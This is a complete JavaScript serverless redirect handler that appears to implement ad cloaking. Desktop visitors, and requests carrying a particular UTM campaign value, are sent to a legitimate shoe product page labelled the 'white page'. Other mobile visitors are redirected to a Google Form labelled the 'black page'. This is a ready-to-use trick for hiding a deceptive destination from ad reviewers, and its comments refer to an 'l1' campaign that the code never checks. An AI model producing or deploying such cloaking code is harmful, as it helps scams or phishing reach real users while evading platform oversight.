export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.gaborshoes.co.uk/womens-c1/shoes-c2/ballet-pumps-c84/maloy-ladies-ballet-pumps-p51995#attribute%5B1%5D=1283";
    const blackPageURL = "https://docs.google.com/forms/d/e/1FAIpQLSdBJrMvgpXkI0pKbmUduysMZjl74QvSVW3NZfiFn4FMyyaL1g/viewform?usp=dialog";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
